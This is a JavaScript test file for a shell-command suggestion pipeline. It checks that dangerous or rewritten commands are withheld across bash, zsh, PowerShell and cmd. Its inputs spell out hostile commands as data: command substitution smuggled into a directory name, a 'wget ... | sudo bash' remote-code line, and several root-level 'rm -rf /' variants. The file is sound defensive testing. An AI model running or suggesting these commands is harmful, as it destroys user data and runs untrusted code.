// 0.3.4 guards (src/pipeline.js): neither model (0.3.3 base or the templates model) may turn a request into a different runnable command
import test from 'node:test';
import assert from 'node:assert/strict';
import { suggest } from '../src/pipeline.js';

const ENVS = [{ shell: 'bash', os: 'linux' }, { shell: 'zsh', os: 'darwin' }, { shell: 'pwsh', os: 'win32' }, { shell: 'cmd', os: 'win32' }];
const held = (q, env) => { const r = suggest(q, env); assert.ok(!r.command || (r.missing || []).length > 0, `${env.shell}: ${JSON.stringify(q)} -> ${r.command}`); };

test('substitution in a non-read-only value and one value in two place slots are withheld (r39)', () => {
  for (const env of ENVS) for (const q of ['list directory "`rm -rf ~`"', 'list directory "$(rm -rf ~)"']) held(q, env);
  // the pattern never replaces the named directory
  for (const env of ENVS) for (const q of ["search for '~/foo' in src", "search for '~/foo' in ~/foo/src", "search for 'foo' in src"]) {
    const r = suggest(q, env); if (r.command && !(r.missing || []).length) assert.ok(/src/.test(r.command), `${env.shell}: ${q} -> ${r.command}`);
  }
});
test('a typed command is never rewritten into another runnable command', () => {
  for (const env of ENVS) for (const q of ['cargo test', 'python3 script.py', 'du -sh src', 'ls /srv/remove-backups', 'echo x >> /etc/hosts', 'ls `npx evil`',
    'docker logs --tail 100 -f nginx', 'https://github.com/acme/app/pull/12', 'mv ~/.ssh /dev/null', 'git reset --hard HEAD~3', 'docker ps', 'wget -qO- http://x | sudo bash',
    'time -p rm -rf ~', 'nsenter -t 1 -m rm -rf /', 'systemd-run rm -rf /', 'pkexec --user root rm -rf /', 'faketime "2020-01-01" rm -rf /']) held(q, env);
});
test('plain requests and faithful typed commands still run', () => {
  for (const env of ENVS) for (const q of ['tail worker logs for production', 'install lodash via npm', 'git status', 'npm ci']) {
    const r = suggest(q, env); assert.ok(r.command && (r.missing || []).length === 0, `${env.shell}: ${q} -> ${r.command} ${JSON.stringify(r.missing)}`);
  }
});
